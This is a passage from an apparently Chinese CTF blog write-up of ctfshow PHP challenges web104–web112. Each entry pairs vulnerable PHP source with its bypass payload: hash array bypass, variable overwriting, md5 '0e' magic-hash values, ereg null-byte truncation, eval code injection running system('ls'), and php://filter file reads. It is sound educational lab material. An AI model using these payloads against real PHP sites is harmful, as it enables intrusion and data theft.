class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有强制类型转换的话，sha1是无法识别数组的，直接就是数组绕过了</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"your are good"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>你还想要flag嘛？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变量覆盖</p><p>首先让$key=suces那么$$key=$suces，然后$value=flag那么$$value=$flag，到这里就覆盖成功了，也就是$suces=$flag</p><p>这里利用的是die($error)来实现的输出，所以让$key=error那么$$key=$error，$value=suces那么$$value=$suces，也就是$error=$suces=$flag，同时又因为不满足if(!($_POST[‘flag’]==$flag))，所以die被执行，得到flag</p><p><strong>payload</strong><code>?suces=flag，post：error=suces</code></p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-parse-str.html" target="_blank" rel="noopener">PHP parse_str() 函数</a></p><p>第二个参数：可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</p><p>利用md5碰撞：使得v1中的flag=0，然后v3=0(md5(QNKCDZO)=0e…)</p><p>payload：<code>vl=flag=0，v3=QNKCDZO)</code></p><p>md5弱碰撞：</p><pre class="line-numbers language-php"><code class="language-php">0e开头的md5和原值：<span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span><span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><p><a href="https://blog.csdn.net/qq_25987491/article/details/79952393" target="_blank" rel="noopener">php中ereg函数的截断漏洞</a></p><p><a href="https://www.php.net/strrev" target="_blank" rel="noopener">strrev函数</a>：反转字符串</p><p>0x36d=877，因为会被反转所以需要778来提前反转，同时需要截断处理，所以<code>c=a%00778</code>经过反转后取整就是877</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo new $v1($v2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为只要有字母就行，所以利用PHP已有的类闭合一下(预防意外的报错导致程序无法正常执行)，然后构造命令执行即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token function">Exception</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;v2=a</span><span class="token operator">?</span>v1<span class="token operator">=</span>ReflectionClass<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token function">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">"PDO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;v2=a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="http://blog.uiste.com/2015/20151018-1.html" target="_blank" rel="noopener">反射 | PDO</a></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo new $v1($v2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>FilesystemIterator获取目录文件<a href="http://phpff.com/filesystemiterator" target="_blank" rel="noopener">FilesystemIterator</a></p><p>getcwd()函数取得当前工作目录<a href="https://www.runoob.com/php/func-directory-getcwd.html" target="_blank" rel="noopener">getcwd()函数</a></p><p><strong>构造playload：</strong></p><p><code>v1=FilesystemIterator&amp;v2=getcwd</code></p><p>得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷：只能获取第一个文件名字</p><p><strong>本地试验例子</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// $iterator = new FilesystemIterator(getcwd());</span> <span class="token comment" spellcheck="true">// //计算迭代器中元素的个数</span> <span class="token comment" spellcheck="true">// printf("There were %d Files", iterator_count($iterator));</span> <span class="token comment" spellcheck="true">//php FilesystemIterator 使用 seek 改变指针位置</span> <span class="token variable">$iterator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token string">"../ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//php FilesystemIterator 使用 seek 改变指针位置</span> <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使用valid()验证是否存在</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//获取当前指针的第一个文件名</span>     <span class="token keyword">echo</span> <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'No file at position 3'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//要遍历当前指针以后的所有文件必须使用while valid()和next()方法，如果使用foreach将会遍历出所有的数据</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//必须要用next方法改变指针位置</span>     <span class="token variable">$iterator</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//php FilesystemIterator 使用 valid next 方法遍历元素</span> <span class="token comment" spellcheck="true">// $iterator = new FilesystemIterator("../ctfshow");</span> <span class="token comment" spellcheck="true">// while($iterator->valid()) {</span> <span class="token comment" spellcheck="true">//     var_dump($iterator->getFilename()) . "\n";</span> <span class="token comment" spellcheck="true">//     //必须要用next方法改变指针位置</span> <span class="token comment" spellcheck="true">//     $iterator->next();</span> <span class="token comment" spellcheck="true">// }</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$$v1 = &amp;$$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span>$<span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//规定v1的值</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用全局变量来实现输出</p><p>v1=ctfshow</p><p>v2=GLOBALS</p><p>$ctfshow=&amp;$GLOBALS此时$ctfshow的指向就是全局变量的指向，于其具有了相同的作用，那么此时var_dump($ctfshow)就是var_dump($GLOBALS)</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当看到input和rot13和base64的时候就能想到利用的是伪协议，并且考点是多种读取方式</p><pre class="line-numbers language-php"><code class="language-php">可以直接用不带任何过滤器的filter伪协议file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/resource=flag.php</span>也可以用一些没有过滤掉的编码方式和转换方式file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.quoted-printable-encode/resource=flag.php</span>file<span class="token operator">=</span>compress<span class="token punctuation">.</span>zlib<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//flag.php</span>↑这是读取压缩流file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span>↑这是两位一反转的读取方式<span aria-hidden="true" 